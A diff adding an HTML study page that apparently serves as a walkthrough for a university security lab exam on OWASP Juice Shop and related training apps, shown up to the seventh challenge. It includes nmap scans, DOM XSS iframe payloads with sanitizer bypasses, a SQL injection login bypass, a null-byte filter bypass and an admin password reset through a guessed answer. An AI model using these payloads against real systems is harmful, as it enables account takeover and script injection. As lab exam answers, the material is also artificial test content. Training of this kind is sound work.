@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab Exam — Complete Foolproof Guide</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap');
+
+  :root {
+    --bg: #0d0f14;
+    --bg2: #13161f;
+    --bg3: #1a1e2a;
+    --bg4: #22273a;
+    --border: #2a2f45;
+    --border2: #363d58;
+    --text: #e8eaf0;
+    --text2: #9da3bc;
+    --text3: #5e6480;
+    --green: #3dd68c;
+    --green-dim: #1a3d2b;
+    --green-border: #2a6647;
+    --yellow: #f5c542;
+    --yellow-dim: #2d2500;
+    --yellow-border: #5a4800;
+    --red: #ff5370;
+    --red-dim: #2d0f15;
+    --red-border: #5a1f2a;
+    --blue: #82aaff;
+    --blue-dim: #0f1a35;
+    --orange: #ff9d57;
+    --orange-dim: #2d1800;
+    --purple: #c792ea;
+    --cyan: #89ddff;
+    --mono: 'JetBrains Mono', monospace;
+    --sans: 'Syne', sans-serif;
+    --radius: 6px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  /* ── Header ── */
+  .header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 20px 14px;
+    position: sticky; top: 0; z-index: 100;
+  }
+  .header-top {
+    display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px;
+  }
+  .header-title {
+    font-family: var(--sans); font-size: 16px; font-weight: 800;
+    letter-spacing: -0.02em; color: var(--text);
+  }
+  .header-title span { color: var(--green); }
+  .progress-info { font-size: 11px; color: var(--text2); font-family: var(--mono); }
+  .progress-track {
+    height: 3px; background: var(--bg4); border-radius: 2px; overflow: hidden;
+  }
+  .progress-fill {
+    height: 100%; background: linear-gradient(90deg, var(--green), #5ef0b0);
+    border-radius: 2px; transition: width 0.4s cubic-bezier(.4,0,.2,1);
+    width: 0%;
+  }
+  .target-pills {
+    display: flex; gap: 6px; margin-top: 10px; flex-wrap: wrap;
+  }
+  .pill {
+    font-size: 10px; padding: 2px 8px; border-radius: 20px;
+    border: 1px solid; font-family: var(--mono);
+  }
+  .pill-green { color: var(--green); border-color: var(--green-border); background: var(--green-dim); }
+  .pill-blue  { color: var(--blue);  border-color: #1a3060; background: var(--blue-dim); }
+  .pill-orange{ color: var(--orange); border-color: #3d2000; background: var(--orange-dim); }
+  .pill-purple{ color: var(--purple); border-color: #3a1f5a; background: #1a0f2d; }
+
+  /* ── Layout ── */
+  .main { max-width: 820px; margin: 0 auto; padding: 20px 16px 60px; }
+
+  /* ── Section (Phase) ── */
+  .section { margin-bottom: 8px; }
+  .section-header {
+    display: flex; align-items: center; gap: 10px;
+    padding: 10px 14px; background: var(--bg2);
+    border: 1px solid var(--border); border-radius: var(--radius);
+    cursor: pointer; user-select: none;
+    transition: background 0.15s, border-color 0.15s;
+  }
+  .section-header:hover { background: var(--bg3); border-color: var(--border2); }
+  .section-badge {
+    font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 3px;
+    letter-spacing: 0.08em; flex-shrink: 0;
+  }
+  .badge-setup  { background: var(--blue-dim); color: var(--blue); border: 1px solid #1a3060; }
+  .badge-enum   { background: #1a2030; color: #82aaff; border: 1px solid #263050; }
+  .badge-juice  { background: var(--green-dim); color: var(--green); border: 1px solid var(--green-border); }
+  .badge-shep   { background: var(--blue-dim); color: var(--cyan); border: 1px solid #1a3060; }
+  .badge-nano   { background: var(--orange-dim); color: var(--orange); border: 1px solid #3d2000; }
+  .badge-wrap   { background: var(--purple-dim,#1a0f2d); color: var(--purple); border: 1px solid #3a1f5a; }
+
+  .section-title { font-family: var(--sans); font-size: 13px; font-weight: 700; flex: 1; }
+  .section-meta { font-size: 10px; color: var(--text3); }
+  .section-chevron { color: var(--text3); font-size: 10px; transition: transform 0.2s; flex-shrink: 0; }
+  .section-chevron.open { transform: rotate(90deg); }
+
+  .section-body { display: none; padding-top: 4px; }
+  .section-body.open { display: block; }
+
+  /* ── Challenge card ── */
+  .challenge {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    margin: 4px 0;
+    overflow: hidden;
+    background: var(--bg);
+  }
+  .challenge.solved { border-color: var(--green-border); }
+
+  .challenge-header {
+    display: flex; align-items: center; gap: 8px;
+    padding: 9px 12px; cursor: pointer;
+    background: var(--bg2);
+    transition: background 0.1s;
+  }
+  .challenge-header:hover { background: var(--bg3); }
+
+  .ch-index {
+    width: 22px; height: 22px; border-radius: 4px; flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 10px; font-weight: 700;
+    background: var(--bg4); color: var(--text2);
+    border: 1px solid var(--border);
+  }
+  .ch-index.solved { background: var(--green-dim); color: var(--green); border-color: var(--green-border); }
+  .ch-title { font-size: 12px; font-weight: 600; flex: 1; color: var(--text); }
+  .ch-stars { font-size: 10px; color: var(--yellow); letter-spacing: -1px; }
+  .ch-tag {
+    font-size: 9px; padding: 1px 5px; border-radius: 3px;
+    border: 1px solid; letter-spacing: 0.05em; font-weight: 600;
+  }
+  .tag-sqli   { color: var(--red); border-color: var(--red-border); background: var(--red-dim); }
+  .tag-xss    { color: var(--orange); border-color: #3d2000; background: var(--orange-dim); }
+  .tag-idor   { color: var(--blue); border-color: #1a3060; background: var(--blue-dim); }
+  .tag-expo   { color: var(--yellow); border-color: var(--yellow-border); background: var(--yellow-dim); }
+  .tag-auth   { color: var(--purple); border-color: #3a1f5a; background: #1a0f2d; }
+  .tag-misc   { color: var(--text2); border-color: var(--border); background: var(--bg3); }
+  .tag-rce    { color: var(--red); border-color: var(--red-border); background: var(--red-dim); }
+  .tag-brute  { color: var(--cyan); border-color: #1a3060; background: var(--blue-dim); }
+  .tag-recon  { color: var(--text2); border-color: var(--border); background: var(--bg3); }
+
+  .ch-chevron { color: var(--text3); font-size: 10px; transition: transform 0.2s; flex-shrink: 0; }
+  .ch-chevron.open { transform: rotate(90deg); }
+
+  .challenge-body { display: none; padding: 12px 14px 14px; }
+  .challenge-body.open { display: block; }
+
+  /* ── Content blocks ── */
+  .block-label {
+    font-size: 9px; font-weight: 700; letter-spacing: 0.1em;
+    color: var(--text3); text-transform: uppercase; margin: 12px 0 5px;
+  }
+  .block-label:first-child { margin-top: 0; }
+
+  .cmd-block {
+    background: var(--bg3); border: 1px solid var(--border2);
+    border-radius: var(--radius); padding: 10px 12px;
+    font-family: var(--mono); font-size: 11.5px;
+    color: var(--text); position: relative;
+    white-space: pre-wrap; word-break: break-all;
+    line-height: 1.7; margin: 4px 0;
+  }
+  .cmd-block .prompt { color: var(--green); font-weight: 700; }
+  .cmd-block .comment { color: var(--text3); }
+  .cmd-block .hl { color: var(--cyan); }
+  .cmd-block .payload { color: var(--red); }
+
+  .copy-btn {
+    position: absolute; top: 7px; right: 7px;
+    font-size: 9px; padding: 2px 7px; border-radius: 3px;
+    border: 1px solid var(--border2); cursor: pointer;
+    background: var(--bg4); color: var(--text2);
+    font-family: var(--mono); transition: all 0.15s;
+  }
+  .copy-btn:hover { background: var(--border2); color: var(--text); }
+  .copy-btn.copied { color: var(--green); border-color: var(--green-border); }
+
+  .out-block {
+    background: var(--bg3); border: 1px solid var(--border);
+    border-left: 3px solid var(--green);
+    border-radius: 0 var(--radius) var(--radius) 0;
+    padding: 9px 12px; font-family: var(--mono);
+    font-size: 11.5px; color: var(--text2);
+    white-space: pre-wrap; line-height: 1.7; margin: 4px 0;
+  }
+  .out-block .hl  { color: var(--green); font-weight: 600; }
+  .out-block .warn{ color: var(--yellow); }
+  .out-block .err { color: var(--red); }
+  .out-block .dim { color: var(--text3); }
+
+  .fix-block {
+    background: var(--yellow-dim); border: 1px solid var(--yellow-border);
+    border-radius: var(--radius); padding: 9px 12px;
+    font-size: 11.5px; color: var(--yellow); line-height: 1.7; margin: 4px 0;
+  }
+  .fix-block b { font-weight: 700; }
+  .fix-block code {
+    background: #3d2f00; padding: 1px 5px; border-radius: 3px;
+    color: var(--orange);
+  }
+
+  .info-block {
+    background: var(--blue-dim); border: 1px solid #1a3060;
+    border-radius: var(--radius); padding: 9px 12px;
+    font-size: 11.5px; color: var(--blue); line-height: 1.7; margin: 4px 0;
+  }
+  .info-block b { color: var(--cyan); font-weight: 700; }
+
+  .critical-block {
+    background: var(--red-dim); border: 1px solid var(--red-border);
+    border-radius: var(--radius); padding: 9px 12px;
+    font-size: 11.5px; color: var(--red); line-height: 1.7; margin: 4px 0;
+  }
+  .critical-block b { font-weight: 700; }
+
+  /* ── Checklist ── */
+  .checklist { margin: 4px 0; }
+  .check-row {
+    display: flex; align-items: flex-start; gap: 9px;
+    padding: 6px 0; border-bottom: 1px solid var(--border);
+    cursor: pointer; user-select: none;
+    transition: opacity 0.15s;
+  }
+  .check-row:last-child { border-bottom: none; }
+  .check-row:hover { opacity: 0.85; }
+  .check-box {
+    width: 15px; height: 15px; border-radius: 3px; flex-shrink: 0; margin-top: 1px;
+    border: 1px solid var(--border2); background: var(--bg3);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 9px; color: var(--green); font-weight: 700;
+    transition: all 0.15s;
+  }
+  .check-box.checked { background: var(--green-dim); border-color: var(--green-border); }
+  .check-label { font-size: 11.5px; color: var(--text); line-height: 1.5; }
+  .check-label.done { color: var(--text3); text-decoration: line-through; }
+
+  /* ── Step divider ── */
+  .step-num-inline {
+    display: inline-block; background: var(--bg4); border: 1px solid var(--border2);
+    border-radius: 3px; font-size: 9px; color: var(--text2); padding: 1px 5px;
+    margin-right: 5px; font-weight: 700;
+  }
+
+  /* ── Scroll ── */
+  html { scroll-behavior: smooth; }
+
+  /* ── Responsive ── */
+  @media(max-width:600px) {
+    .main { padding: 14px 10px 60px; }
+    .cmd-block, .out-block { font-size: 10.5px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-top">
+    <div class="header-title">Lab Exam <span>Guide</span></div>
+    <div class="progress-info" id="prog-text">0 / 0 done</div>
+  </div>
+  <div class="progress-track"><div class="progress-fill" id="prog-fill"></div></div>
+  <div class="target-pills">
+    <span class="pill pill-green">🟢 Juice Shop — 12+ challenges</span>
+    <span class="pill pill-blue">🔵 Security Shepherd — 4 challenges</span>
+    <span class="pill pill-orange">🟠 Nanocorp Bites — recon only</span>
+    <span class="pill pill-purple">⚡ All outputs shown · All fixes included</span>
+  </div>
+</div>
+
+<div class="main" id="app"></div>
+
+<script>
+// ════════════════════════════════════════════════
+// DATA — each section → challenges → steps/checks
+// ════════════════════════════════════════════════
+const GUIDE = [
+
+// ──────────────────────────────────────────────
+{
+  id:'p0', badge:'SETUP', badgeClass:'badge-setup',
+  title:'Environment Setup & Verification',
+  meta:'Do this FIRST before anything else',
+  challenges:[
+    {
+      id:'c0_1', title:'Start the lab executable', tag:'misc',
+      checks:[
+        'Downloaded lab file from Proton Drive (password: lab$@MSRIT)',
+        'Saved the exact filename — you need it for chmod',
+        'Made it executable and ran it',
+        'All 3 services show "running" (not "Exited" or "Error")',
+      ],
+      steps:[
+        { label:'COMMANDS', type:'cmd',
+          text:'<span class="comment"># Replace &lt;filename&gt; with the actual downloaded file name</span>\n<span class="prompt">$</span> <span class="hl">chmod +x</span> &lt;filename&gt;\n<span class="prompt">$</span> ./<span class="hl">&lt;filename&gt;</span>' },
+        { label:'EXPECTED OUTPUT — all 3 services must say "running"', type:'out',
+          text:'[+] Starting containers...\n<span class="hl">[+] juice-shop         running on 0.0.0.0:3000</span>\n<span class="hl">[+] security-shepherd  running on 0.0.0.0:8080</span>\n<span class="hl">[+] nanocorp-bites     running on 0.0.0.0:5000</span>\n\nAll containers: UP' },
+        { label:'IF SOMETHING SHOWS "EXITED" OR "ERROR"', type:'fix',
+          text:'<b>Run:</b> <code>docker ps -a</code> to see which container failed.<br>Tell the lab assistant immediately. Do NOT try to restart yourself — you may corrupt the state.' },
+      ]
+    },
+    {
+      id:'c0_2', title:'Confirm you are on the right subnet', tag:'recon',
+      checks:[
+        'Ran ip a — noted your IP address',
+        'Your IP starts with 192.168.20',
+        'Written the last octet (X) on paper for use in all URLs',
+      ],
+      steps:[
+        { label:'COMMAND', type:'cmd', text:'<span class="prompt">$</span> ip a' },
+        { label:'EXPECTED — find a line like this', type:'out',
+          text:'2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;\n    inet <span class="hl">192.168.20.X</span>/24 brd 192.168.20.255 scope global eth0\n          ↑\n    Write this down — YOUR_IP' },
+        { label:'WRONG SUBNET', type:'fix',
+          text:'<b>If you see only 10.x.x.x or 172.x.x.x:</b> Your VM is not on bridged mode.<br>VirtualBox: Settings → Network → Adapter 1 → Attached to: Bridged Adapter → OK → Restart VM.' },
+      ]
+    },
+  ]
+},
+
+// ──────────────────────────────────────────────
+{
+  id:'p1', badge:'ENUM', badgeClass:'badge-enum',
+  title:'Network Enumeration (Do Before Anything Else)',
+  meta:'Find the IPs and ports — yours will differ from examples',
+  challenges:[
+    {
+      id:'c1_1', title:'Host discovery — find live IPs', tag:'recon',
+      checks:[
+        'Found 3 target hosts (not counting your own IP or gateway)',
+        'Written all 3 IPs on paper with a label (JS=Juice Shop, SS=Shepherd, NC=Nanocorp)',
+      ],
+      steps:[
+        { label:'COMMAND', type:'cmd', text:'<span class="prompt">$</span> nmap -sn 192.168.20.0/24' },
+        { label:'EXPECTED OUTPUT', type:'out',
+          text:'Nmap scan report for 192.168.20.1\n<span class="dim">Host is up. (router/gateway — ignore)</span>\nNmap scan report for 192.168.20.5\n<span class="warn">Host is up.  ← this is YOUR machine — ignore</span>\n<span class="hl">Nmap scan report for 192.168.20.10\nHost is up.  ← TARGET\nNmap scan report for 192.168.20.11\nHost is up.  ← TARGET\nNmap scan report for 192.168.20.12\nHost is up.  ← TARGET</span>\n\nNmap done: 256 IP addresses (5 hosts up) scanned' },
+        { label:'IF YOU ONLY SEE 1–2 HOSTS', type:'fix',
+          text:'<b>Lab containers may not be fully started yet.</b> Wait 60 seconds, run again.<br>Still nothing? Run <code>docker ps</code> on the host machine and call the lab assistant.' },
+      ]
+    },
+    {
+      id:'c1_2', title:'Service scan — identify which port runs which app', tag:'recon',
+      checks:[
+        'Identified the IP running Juice Shop (port 3000)',
+        'Identified the IP running Security Shepherd (port 8080)',
+        'Identified the IP running Nanocorp Bites (port 5000)',
+        'Written IP:PORT for all 3 on paper',
+      ],
+      steps:[
+        { label:'COMMAND — run for EACH of the 3 target IPs', type:'cmd',
+          text:'<span class="prompt">$</span> nmap -sV -sC --top-ports 1000 <span class="hl">192.168.20.X</span> --open\n<span class="comment"># If that\'s slow, try: nmap -sV -p 3000,5000,8080 192.168.20.X</span>' },
+        { label:'JUICE SHOP — look for this in output', type:'out',
+          text:'PORT     STATE SERVICE VERSION\n<span class="hl">3000/tcp open  http    Node.js Express framework\n|_http-title: OWASP Juice Shop</span>' },
+        { label:'SECURITY SHEPHERD — look for this', type:'out',
+          text:'PORT     STATE SERVICE VERSION\n<span class="hl">8080/tcp open  http    Apache Tomcat\n|_http-title: Security Shepherd</span>' },
+        { label:'NANOCORP BITES — look for this', type:'out',
+          text:'PORT     STATE SERVICE VERSION\n<span class="hl">5000/tcp open  http    Werkzeug httpd (Python 3.x)\n|_http-title: Nanocorp Bites</span>' },
+        { label:'IF PORT SHOWS "FILTERED"', type:'fix',
+          text:'<b>That service may be on a different IP.</b> Scan all 3 target IPs.<br>If still filtered: <code>nmap -sV -p- 192.168.20.X</code> (slower, checks all 65535 ports).' },
+      ]
+    },
+    {
+      id:'c1_3', title:'Confirm all 3 apps load in browser', tag:'recon',
+      checks:[
+        'Juice Shop loads — orange OWASP shop page visible',
+        'Security Shepherd loads — dark login/register page visible',
+        'Nanocorp Bites loads — food delivery portal visible',
+      ],
+      steps:[
+        { label:'OPEN ALL 3 IN FIREFOX — NEW TAB EACH', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000\nhttp://192.168.20.[SHEPHERD_IP]:8080\nhttp://192.168.20.[NANOCORP_IP]:5000\n\n<span class="comment"># Replace [X_IP] with the IP from your nmap output</span>' },
+        { label:'IF BROWSER SHOWS "UNABLE TO CONNECT"', type:'fix',
+          text:'<b>1.</b> Recheck the port number from your nmap scan output.<br><b>2.</b> Try pinging: <code>ping 192.168.20.X</code> — if no reply, wrong IP.<br><b>3.</b> Try both http:// and https:// prefixes.' },
+      ]
+    },
+  ]
+},
+
+// ──────────────────────────────────────────────
+{
+  id:'p2', badge:'ACCOUNTS', badgeClass:'badge-setup',
+  title:'Register Accounts (Required for Scoring)',
+  meta:'Use your USN — examiners match scores by USN',
+  challenges:[
+    {
+      id:'c2_1', title:'Register on Juice Shop with your USN', tag:'auth',
+      checks:[
+        'Navigated to /#/register on Juice Shop',
+        'Email set to your exact USN format: 1MSXXCSXXX@msrit.edu',
+        'Password chosen and remembered',
+        'Logged in — USN initials visible top-right',
+        'Visited /#/score-board — green toast fired (F-01 done!)',
+        'Screenshot taken: score-board page with your USN top-right AND URL bar visible',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/#/register\n\nEmail:    <span class="hl">1MSXXCSXXX@msrit.edu</span>  ← your actual USN\nPassword: anything (e.g. Test@1234)\nSecurity Question: anything\nSecurity Answer: anything\n\nClick: REGISTER' },
+        { label:'AFTER REGISTER — LOGIN, THEN GO TO', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/#/login\n<span class="comment"># Login with the email and password you just set</span>\n\n<span class="comment"># Then immediately navigate to:</span>\nhttp://192.168.20.[JUICE_IP]:3000/#/score-board' },
+        { label:'EXPECTED — top-right of page after login', type:'out',
+          text:'[Avatar circle with your initials]\n<span class="hl">1MSXXCSXXX@msrit.edu</span> ← must show your USN\n\n<span class="hl">✔ challenge solved — Score Board</span>  ← green toast fires on score-board visit' },
+        { label:'IF REGISTRATION FAILS', type:'fix',
+          text:'<b>Email already taken:</b> Add a digit: 1MSXXCSXXX1@msrit.edu<br><b>Page does not load:</b> Confirm you are hitting the right IP and port 3000.' },
+      ]
+    },
+    {
+      id:'c2_2', title:'Register on Security Shepherd with your USN', tag:'auth',
+      checks:[
+        'Navigated to Security Shepherd login page',
+        'Clicked "Register" link',
+        'Username set to your USN (1MSXXCSXXX)',
+        'Logged in successfully',
+        'Navigated to /scoreboard.jsp — 0 points visible',
+        'Screenshot taken of scoreboard with your USN and URL',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[SHEPHERD_IP]:8080\n\n<span class="comment"># Click "Register a Security Shepherd Account"</span>\nUsername: <span class="hl">1MSXXCSXXX</span>  ← your USN, no @msrit.edu here\nPassword: anything (e.g. Test@1234)\nConfirm Password: same\n\nClick: REGISTER\n\n<span class="comment"># Then login and navigate to:</span>\nhttp://192.168.20.[SHEPHERD_IP]:8080/scoreboard.jsp' },
+        { label:'EXPECTED SCOREBOARD', type:'out',
+          text:'Security Shepherd Scoreboard\nUser: <span class="hl">1MSXXCSXXX</span>\nPoints: 0  ← will increase as you solve challenges' },
+      ]
+    },
+  ]
+},
+
+// ──────────────────────────────────────────────
+{
+  id:'p3', badge:'JUICE SHOP', badgeClass:'badge-juice',
+  title:'OWASP Juice Shop — 12 Challenges',
+  meta:'Complete as many as possible · each one shows a green toast when solved',
+  challenges:[
+
+    {
+      id:'js1', title:'JS-01 — Score Board (Security Misconfiguration ★)', tag:'misc', stars:'★',
+      checks:[
+        'Logged into Juice Shop with your USN email',
+        'Navigated directly to /#/score-board',
+        'Green toast appeared: "challenge solved — Score Board"',
+        'Score Board card is now green/ticked',
+        'Screenshot: full page with URL bar + your USN top-right',
+      ],
+      steps:[
+        { label:'COMMAND', type:'cmd',
+          text:'<span class="comment"># Must be logged in first. Then navigate to:</span>\nhttp://192.168.20.[JUICE_IP]:3000/#/score-board' },
+        { label:'EXPECTED — green toast slides from bottom-right', type:'out',
+          text:'<span class="hl">✔  challenge solved\n   Score Board</span>\n\nThe "Score Board" card on the page turns green.\nYour score increases by 10 points.' },
+        { label:'IF TOAST DOES NOT APPEAR', type:'fix',
+          text:'<b>Are you logged in?</b> Check top-right — if it says "Login" you are not. Login first, then navigate to /#/score-board again.' },
+      ]
+    },
+
+    {
+      id:'js2', title:'JS-02 — DOM XSS via Track Order (★★)', tag:'xss', stars:'★★',
+      checks:[
+        'Added any item to cart',
+        'Checked out and placed the order',
+        'Found the order in Account → Orders & Payment → Order History',
+        'Clicked the 🚚 truck icon next to the order',
+        'URL changed to /#/track-result?id=...',
+        'Replaced the id= value with the XSS payload',
+        'Alert dialog appeared — the title shows your Juice Shop IP',
+        'Clicked OK on alert',
+        'Green toast appeared: "challenge solved — DOM XSS"',
+        'Screenshot: alert dialog visible + URL bar showing the payload',
+      ],
+      steps:[
+        { label:'STEP 1 — place any order', type:'cmd',
+          text:'<span class="comment"># Click any product → "Add to Cart"</span>\nAccount menu → Basket → Checkout → Continue\n<span class="comment"># Select any address → any delivery option → Place Your Order</span>' },
+        { label:'STEP 2 — find your order and get the track URL', type:'cmd',
+          text:'Account menu → Orders & Payment → Order History\n<span class="comment"># Click the truck icon 🚚 next to your order</span>\n<span class="comment"># URL bar will now show something like:</span>\n/#/track-result?id=<span class="hl">abc-1234-xyz</span>' },
+        { label:'STEP 3 — inject the XSS payload in the URL bar', type:'cmd',
+          text:'<span class="comment"># Click the address bar. Delete EVERYTHING after ?id= and type:</span>\n<span class="payload">&lt;iframe src="javascript:alert(`xss`)"&gt;</span>\n\n<span class="comment"># Full URL looks like:</span>\nhttp://192.168.20.X:3000/#/track-result?id=<span class="payload">&lt;iframe src="javascript:alert(`xss`)"&gt;</span>\n\nPress ENTER' },
+        { label:'EXPECTED — browser alert dialog pops up', type:'out',
+          text:'┌─────────────────────────────────────────┐\n│  <span class="hl">192.168.20.X:3000</span>  says:               │\n│                                         │\n│  xss                                    │\n│                                         │\n│                            [   OK   ]   │\n└─────────────────────────────────────────┘\n\n<span class="hl">← IP in dialog title proves it ran on target page</span>\nAfter clicking OK:\n<span class="hl">✔  challenge solved — DOM XSS</span>' },
+        { label:'IF ALERT DOES NOT FIRE', type:'fix',
+          text:'<b>Browser URL-encoded your payload.</b> Use DevTools console instead:<br><br>Press F12 → Console tab → paste exactly:<br><code>location.hash = \'#/track-result?id=&lt;iframe src="javascript:alert(`xss`)"&gt;\'</code><br>Press Enter.<br><br><b>Still nothing:</b> Try the percent-encoded version in address bar:<br><code>/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E</code>' },
+      ]
+    },
+
+    {
+      id:'js3', title:'JS-03 — Admin Login via SQL Injection (★★)', tag:'sqli', stars:'★★',
+      checks:[
+        'Navigated to /#/login',
+        'Entered SQL injection payload in the Email field',
+        'Clicked Log In without a real password',
+        'Logged in as admin@juice-sh.op',
+        'Green toast: "challenge solved — Login Admin"',
+        'Verified via /rest/user/whoami — role: admin shown in JSON',
+        'Screenshot: admin email visible top-right + URL bar',
+      ],
+      steps:[
+        { label:'NAVIGATE TO LOGIN', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/#/login' },
+        { label:'ENTER THESE VALUES', type:'cmd',
+          text:'Email field:    <span class="payload">\' OR 1=1-- </span>\n                          ↑ there is a SPACE after the two dashes\nPassword field: abc\n\nClick: LOG IN' },
+        { label:'EXPECTED — logged in as admin', type:'out',
+          text:'Top-right shows: <span class="hl">admin@juice-sh.op</span>\n\n<span class="hl">✔  challenge solved — Login Admin</span>  ← green toast' },
+        { label:'VERIFY YOU ARE ADMIN', type:'cmd',
+          text:'<span class="comment"># Open a new tab and go to:</span>\nhttp://192.168.20.[JUICE_IP]:3000/rest/user/whoami' },
+        { label:'EXPECTED WHOAMI RESPONSE', type:'out',
+          text:'{\n  "user": {\n    "id": 1,\n    <span class="hl">"email": "admin@juice-sh.op",</span>\n    <span class="hl">"role": "admin"</span>\n  }\n}' },
+        { label:'IF "INVALID EMAIL OR PASSWORD"', type:'fix',
+          text:'<b>The space after -- is missing, or quotes got mangled.</b><br>Try this simpler payload instead — just type it character by character:<br><code>\'--</code>  (apostrophe then two dashes, nothing else)<br><br>This comments out the password check and logs in as the first user (admin).' },
+      ]
+    },
+
+    {
+      id:'js4', title:'JS-04 — Search Bar DOM XSS (★★★)', tag:'xss', stars:'★★★',
+      checks:[
+        'Clicked the magnifying glass icon top-right',
+        'Pasted the payload into the search field',
+        'Pressed Enter',
+        'Alert fired OR Soundcloud iframe embedded in results',
+        'Green toast appeared: "challenge solved — DOM XSS"',
+        'Screenshot: search box with payload visible + alert or iframe',
+      ],
+      steps:[
+        { label:'STEP 1 — open search bar', type:'cmd',
+          text:'<span class="comment"># Click the magnifying glass 🔍 icon in the top-right of Juice Shop</span>\n<span class="comment"># A search input appears</span>' },
+        { label:'STEP 2A — try the iframe alert payload first', type:'cmd',
+          text:'<span class="payload">&lt;iframe src="javascript:alert(`xss`)"&gt;</span>\n\n<span class="comment"># Paste into search field, press Enter</span>' },
+        { label:'IF STEP 2A DOES NOT FIRE AN ALERT — use Soundcloud payload', type:'cmd',
+          text:'<span class="payload">&lt;iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true"&gt;&lt;/iframe&gt;</span>\n\n<span class="comment"># Paste the whole thing into search, press Enter</span>' },
+        { label:'EXPECTED — Soundcloud player embeds in search results', type:'out',
+          text:'Search results show an embedded Soundcloud audio player.\nAudio may start playing automatically.\n<span class="hl">✔  challenge solved — DOM XSS</span>\n\n<span class="hl">← Same challenge as JS-02 but triggered from different input</span>' },
+        { label:'IF TEXT APPEARS LITERALLY (NOT INTERPRETED)', type:'fix',
+          text:'<b>Angular sanitizer blocked the payload.</b> The Soundcloud iframe is known to bypass the attribute whitelist — make sure you paste the complete iframe tag including all attributes.<br>If still failing, note in your report: "Angular 8+ CSP blocks raw JS iframes; used Soundcloud bypass."' },
+      ]
+    },
+
+    {
+      id:'js5', title:'JS-05 — FTP Sensitive Data Exposure (★★)', tag:'expo', stars:'★★',
+      checks:[
+        'Navigated to /ftp on Juice Shop',
+        'Directory listing visible in browser',
+        'Clicked acquisitions.md to download it',
+        'Green toast appeared: "challenge solved — Confidential Document"',
+        'Screenshot: directory listing visible + toast + URL bar',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/ftp' },
+        { label:'EXPECTED — directory listing', type:'out',
+          text:'Index of /ftp\n──────────────────────────────────────────\n<span class="hl">acquisitions.md</span>          2.3 KB\ncoupons_2013.md.bak      1.1 KB\neastere.gg               0.9 KB\npackage.json.bak         3.4 KB\n──────────────────────────────────────────\n\nClick acquisitions.md → download starts → toast fires.' },
+        { label:'EXPECTED TOAST', type:'out',
+          text:'<span class="hl">✔  challenge solved — Confidential Document</span>' },
+        { label:'IF ACQUISITIONS.MD GIVES 403', type:'fix',
+          text:'<b>Use the null-byte bypass:</b><br><code>http://192.168.20.X:3000/ftp/acquisitions.md%2500.md</code><br><br>This tricks the file filter by appending a null byte before the extension.<br><br><b>If /ftp gives 404:</b> Note it as a finding — "FTP directory unexpectedly absent; this endpoint should exist and its absence may indicate misconfiguration."' },
+      ]
+    },
+
+    {
+      id:'js6', title:'JS-06 — User Enumeration via Forgot Password (★★)', tag:'auth', stars:'★★',
+      checks:[
+        'Navigated to /#/forgot-password',
+        'Entered admin@juice-sh.op in the email field',
+        'Security question appeared for that account',
+        'Noted the security question text',
+        'Screenshot: email + security question visible',
+      ],
+      steps:[
+        { label:'NAVIGATE TO', type:'cmd',
+          text:'http://192.168.20.[JUICE_IP]:3000/#/forgot-password' },
+        { label:'ENTER THE ADMIN EMAIL', type:'cmd',
+          text:'Email: <span class="hl">admin@juice-sh.op</span>\n\n<span class="comment"># Tab out of the field or click Next</span>' },
+        { label:'EXPECTED — security question loads', type:'out',
+          text:'Security Question: <span class="hl">Your eldest siblings middle name?</span>\n                         ← or similar personal question\n\nThis confirms the account exists AND reveals the question used.\n<span class="hl">✔  challenge solved — Password Strength</span> (if you also find the answer)' },
+        { label:'BONUS — answer is in leaked data', type:'info',
+          text:'<b>The answer is often "Jim".</b> Try it. If correct, you can set a new admin password — screenshot the reset confirmation page.' },
+      ]
+    },
+
+    {
+      id:'js7', title:'JS-07 — API Access: Exposed Admin Panel (★★)', tag:'idor', stars:'★★',
+      checks:[
+        'Navigated to /#/administration while logged in as admin',
+        'Admin panel visible with all user list',
+        'Screenshot: admin panel + URL bar + your USN logged in',
+      ],
+      steps:[
+        { label:'MUST BE LOGGED IN AS ADMIN FIRST (see JS-03)', type:'cmd',
+          text:'<span class="comment"># Login as admin via SQLi (JS-03) OR use any admin credentials found</span>\n\n<span class="comment"># Then navigate to:</span>\nhttp://192.168.20.[JUICE_IP]:3000/#/administration' },
+        { label:'EXPECTED', type:'out',
+          text:'<span class="hl">Administration</span>\n──────────────────────────────────────\nRegistered Users:\n  1  admin@juice-sh.op     [Delete]\n  2  1MSXXCSXXX@msrit.edu  [Delete]\n  ...\n\n<span class="hl">✔  challenge solved — Admin Section</span>  ← toast fires' },
+        { label:'IF PAGE REDIRECTS TO HOME', type:'fix',
+          text:'<b>You are not logged in as admin.</b> Redo JS-03 SQL injection, then immediately visit /#/administration.' },
+      ]
+    },
+
+    {
